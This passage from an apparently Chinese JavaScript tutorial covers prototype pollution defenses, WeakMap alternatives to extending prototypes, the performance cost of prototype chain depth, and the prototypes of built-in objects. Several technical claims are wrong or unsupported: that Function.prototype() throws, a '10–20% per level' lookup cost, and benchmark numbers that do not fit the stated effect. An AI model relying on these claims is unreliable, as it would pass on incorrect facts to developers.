class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);<br>safeObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(safeObj.<span class="hljs-property">hasOwnProperty</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（2）安全的对象合并</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeMerge</span>(<span class="hljs-params">target, source</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, target, source);<br>  <span class="hljs-comment">// 或使用展开运算符</span><br>  <span class="hljs-comment">// return &#123; ...target, ...source &#125;;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（3）原型属性检查</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params">obj, path, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> parts = path.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<br>  <span class="hljs-keyword">let</span> current = obj;<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; parts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (parts[i] === <span class="hljs-string">&#x27;__proto__&#x27;</span> || parts[i] === <span class="hljs-string">&#x27;constructor&#x27;</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Prototype pollution attempt&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">// ...其余逻辑</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（4）使用 Map 代替 Object</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> safeMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br>safeMap.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-comment">// 无法通过原型链污染</span><br></code></pre></td></tr></table></figure><p>（5）冻结原型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">isAdmin</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 在严格模式下会报错</span><br></code></pre></td></tr></table></figure><h2 id="7-3-使用-WeakMap-替代原型扩展"><a href="#7-3-使用-WeakMap-替代原型扩展" class="headerlink" title="7.3 使用 WeakMap 替代原型扩展"></a>7.3 使用 <code>WeakMap</code> 替代原型扩展</h2><p><strong>传统原型扩展存在的问题</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 向原型添加方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>&#125;;<br><br><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br></code></pre></td></tr></table></figure><p>（1）全局污染：影响所有同类对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> []) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key); <span class="hljs-comment">// 会输出 &quot;last&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）命名冲突</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;A&#x27;</span> &#125;;<br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">last</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;B&#x27;</span> &#125;; <span class="hljs-comment">// 被覆盖</span><br></code></pre></td></tr></table></figure><p>（3）安全风险</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 恶意代码可能修改原生方法</span><br><span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">map</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 恶意操作 */</span> &#125;;<br></code></pre></td></tr></table></figure><p><strong>替代方案</strong></p><p>（1）私有数据存储模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> privateData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    privateData.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, &#123; name &#125;);<br>  &#125;<br>  <br>  <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> privateData.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">name</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">getName</span>()); <span class="hljs-comment">// &quot;Alice&quot;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);      <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（2）方法扩展替代方案</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arrayExtensions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">extendArray</span>(<span class="hljs-params">arr</span>) &#123;<br>  <span class="hljs-keyword">if</span> (!arrayExtensions.<span class="hljs-title function_">has</span>(arr)) &#123;<br>    arrayExtensions.<span class="hljs-title function_">set</span>(arr, &#123;<br>      <span class="hljs-attr">last</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>[<span class="hljs-variable language_">this</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// 将方法绑定到实例</span><br>    arr.<span class="hljs-property">last</span> = arrayExtensions.<span class="hljs-title function_">get</span>(arr).<span class="hljs-property">last</span>.<span class="hljs-title function_">bind</span>(arr);<br>  &#125;<br>  <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-keyword">const</span> myArr = <span class="hljs-title function_">extendArray</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myArr.<span class="hljs-title function_">last</span>()); <span class="hljs-comment">// 3</span><br><br><span class="hljs-comment">// 不影响其他数组</span><br><span class="hljs-keyword">const</span> normalArr = [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(normalArr.<span class="hljs-property">last</span>); <span class="hljs-comment">// undefined</span><br></code></pre></td></tr></table></figure><p>（3）元数据关联模式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title function_">addMetadata</span>(obj, &#123; <span class="hljs-attr">created</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getMetadata</span>(obj)); <span class="hljs-comment">// &#123; created: 162... &#125;</span><br></code></pre></td></tr></table></figure><h2 id="7-4-性能优化：减少原型链深度"><a href="#7-4-性能优化：减少原型链深度" class="headerlink" title="7.4 性能优化：减少原型链深度"></a>7.4 性能优化：减少原型链深度</h2><p><strong>原型链深度对性能的影响机制</strong></p><ul><li>属性查找：每级原型链增加 10% ～ 20% 的查找时间（V8 引擎数据）</li><li>缓存失效：现代 JavaScript 引擎的隐藏类优化会被过深原型链破坏</li><li>内存占用：每级原型链需要额外的内存存储引用</li></ul><p><strong>测试原型链深度的影响</strong></p><p>基准测试用例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建不同深度的原型链</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createChain</span>(<span class="hljs-params">depth</span>) &#123;<br>  <span class="hljs-keyword">let</span> current = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; depth; i++) &#123;<br>    <span class="hljs-keyword">const</span> newObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(current);<br>    newObj[<span class="hljs-string">`prop<span class="hljs-subst">$&#123;i&#125;</span>`</span>] = i;<br>    current = newObj;<br>  &#125;<br>  <span class="hljs-keyword">return</span> current;<br>&#125;<br><br><span class="hljs-comment">// 测试属性访问速度</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">testAccess</span>(<span class="hljs-params">obj, prop</span>) &#123;<br>  <span class="hljs-keyword">const</span> start = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) &#123;<br>    obj[prop];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - start;<br>&#125;<br><br><span class="hljs-keyword">const</span> depths = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>];<br>depths.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">depth</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> obj = <span class="hljs-title function_">createChain</span>(depth);<br>  <span class="hljs-keyword">const</span> time = <span class="hljs-title function_">testAccess</span>(obj, <span class="hljs-string">`prop<span class="hljs-subst">$&#123;depth-<span class="hljs-number">1</span>&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Depth <span class="hljs-subst">$&#123;depth&#125;</span>: <span class="hljs-subst">$&#123;time.toFixed(<span class="hljs-number">2</span>)&#125;</span>ms`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>测试结果（Chrome 137.0.7151.120（正式版本） (x86_64)）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title class_">Depth</span> <span class="hljs-number">1</span>: <span class="hljs-number">3.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">3</span>: <span class="hljs-number">11.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">5</span>: <span class="hljs-number">12.</span>00ms<br><span class="hljs-title class_">Depth</span> <span class="hljs-number">10</span>: <span class="hljs-number">10.</span>00ms<br></code></pre></td></tr></table></figure><p><strong>优化策略</strong></p><p>（1）扁平化继承结构</p><p>优化前（传统深继承）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">A</span> &#123; <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">B</span> &#123; <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123;&#125; &#125;<br><span class="hljs-comment">// 原型链：C → B → A → Object</span><br></code></pre></td></tr></table></figure><p>优化后（组合+扁平）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span> = &#123;<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodA&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodB&#x27;</span>),<br>      ...<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./methodC&#x27;</span>)<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-title function_">methodA</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodA</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodB</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodB</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>  <span class="hljs-title function_">methodC</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">methods</span>.<span class="hljs-property">methodC</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>); &#125;<br>&#125;<br><span class="hljs-comment">// 原型链：Base → Object</span><br></code></pre></td></tr></table></figure><p>（2）方法直接挂载实例</p><p>优化前：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>  &#125;<br>  <br>  <span class="hljs-title function_">process</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* 频繁调用的方法 */</span> &#125;<br>&#125;<br><span class="hljs-comment">// 方法在原型上，每次访问需要查链</span><br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = heavyData;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">process</span> = <span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">/* 直接绑定到实例 */</span> &#125;;<br>  &#125;<br>&#125;<br><span class="hljs-comment">// 首次创建成本稍高，但访问更快</span><br></code></pre></td></tr></table></figure><p>（3）使用对象组合替代继承</p><p>优化前：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123; <span class="hljs-comment">/* 基础方法 */</span> &#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">User</span> &#123; <span class="hljs-comment">/* 特权方法 */</span> &#125;<br><span class="hljs-comment">// 原型链深度：2</span><br></code></pre></td></tr></table></figure><p>优化后：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> userMethods = &#123; <span class="hljs-comment">/* 基础方法 */</span> &#125;;<br><span class="hljs-keyword">const</span> adminMethods = &#123; <span class="hljs-comment">/* 特权方法 */</span> &#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createAdmin</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, userMethods, adminMethods);<br>&#125;<br><span class="hljs-comment">// 原型链深度：0</span><br></code></pre></td></tr></table></figure><p>（4）选择性缓存高频访问方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HeavyUsedClass</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 缓存高频方法引用</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">frequentMethod</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br>  <br>  <span class="hljs-title function_">frequentMethod</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyUsedClass</span>();<br><span class="hljs-comment">// 后续调用直接使用 instance.frequentMethod() 不需要查原型链</span><br></code></pre></td></tr></table></figure><h1 id="第八章：内置对象的原型结构"><a href="#第八章：内置对象的原型结构" class="headerlink" title="第八章：内置对象的原型结构"></a>第八章：内置对象的原型结构</h1><h2 id="8-1-数组的原型链：Array-prototype"><a href="#8-1-数组的原型链：Array-prototype" class="headerlink" title="8.1 数组的原型链：Array.prototype"></a>8.1 数组的原型链：<code>Array.prototype</code></h2><p>JavaScript 中数组的原型链遵循以下层次结构</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[实际数组实例] <br>→ Array.prototype <br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p><strong>Array.prototype 层详解 - 核心方法分类</strong></p><table><thead><tr><th align="left">方法类型</th><th align="left">示例方法</th><th align="left">ES版本</th></tr></thead><tbody><tr><td align="left">修改器方法</td><td align="left">push(), pop(), splice(), sort()</td><td align="left">ES1</td></tr><tr><td align="left">访问方法</td><td align="left">concat(), slice(), join()</td><td align="left">ES1</td></tr><tr><td align="left">迭代方法</td><td align="left">forEach(), map(), filter()</td><td align="left">ES5</td></tr><tr><td align="left">查找方法</td><td align="left">find(), findIndex(), includes()</td><td align="left">ES6+</td></tr><tr><td align="left">转换方法</td><td align="left">toString(), toLocaleString()</td><td align="left">ES1</td></tr></tbody></table><h2 id="8-2-函数的原型链：Function-prototype"><a href="#8-2-函数的原型链：Function-prototype" class="headerlink" title="8.2 函数的原型链：Function.prototype"></a>8.2 函数的原型链：<code>Function.prototype</code></h2><p><strong>函数原型链层次结构</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[函数实例]<br>→ Function.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p><strong>Function.prototype 层详解 - 核心方法分类</strong></p><table><thead><tr><th align="left">方法名</th><th align="left">作用描述</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">apply()</td><td align="left">指定this值并以数组形式传参</td><td align="left">函数返回值</td></tr><tr><td align="left">call()</td><td align="left">指定this值并逐个传参</td><td align="left">函数返回值</td></tr><tr><td align="left">bind()</td><td align="left">创建绑定this的新函数</td><td align="left">函数</td></tr><tr><td align="left">toString()</td><td align="left">返回函数源码字符串</td><td align="left">字符串</td></tr></tbody></table><p><strong>特殊行为</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Function.prototype 本身是一个函数</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// &quot;function&quot;</span><br><br><span class="hljs-comment">// 但无法正常调用</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Function</span>.<span class="hljs-title function_">prototype</span>();<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(e); <span class="hljs-comment">// TypeError: Function.prototype requires &#x27;this&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-3-包装类型（String-Number-Boolean）的原型"><a href="#8-3-包装类型（String-Number-Boolean）的原型" class="headerlink" title="8.3 包装类型（String&#x2F;Number&#x2F;Boolean）的原型"></a>8.3 包装类型（String&#x2F;Number&#x2F;Boolean）的原型</h2><p>JavaScript 中的基本类型（string&#x2F;number&#x2F;boolean）在被当成对象使用时，会被自动转换为对应的包装对象，这些包装对象拥有各自的原型链结构</p><p><strong>String 包装类型</strong></p><p>原型链结构如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">[String实例]<br>→ String.prototype<br>  → Object.prototype<br>    → null<br></code></pre></td></tr></table></figure><p>String.prototype 的核心方法有：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 字符串操作方法</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">concat</span>(<span class="hljs-string">&#x27;def&#x27;</span>)      <span class="hljs-comment">// &#x27;abcdef&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>)      <span class="hljs-comment">// &#x27;el&#x27;</span><br><span class="hljs-string">&#x27;ABC&#x27;</span>.<span class="hljs-title function_">toLowerCase</span>()      <span class="hljs-comment">// &#x27;abc&#x27;</span><br><br><span class="hljs-comment">// ES6+ 新增方法</span><br><span class="hljs-string">&#x27;  abc  &#x27;</span>.<span class="hljs-title function_">trim</span>()         <span class="hljs-comment">// &#x27;abc&#x27;</span><br><span class="hljs-string">&#x27;hello&#x27;</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;he&#x27;</span>) <span class="hljs-comment">// true</span><br><span class="hljs-string">&#x27;abc&#x27;</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">2</span>)          <span class="hljs-comment">// &#x27;abcabc&#x27;</span><br><br><span class="hljs-comment">// 迭代方法</span><br><span class="hljs-string">&#x27;😊&#x27;</span>.<span 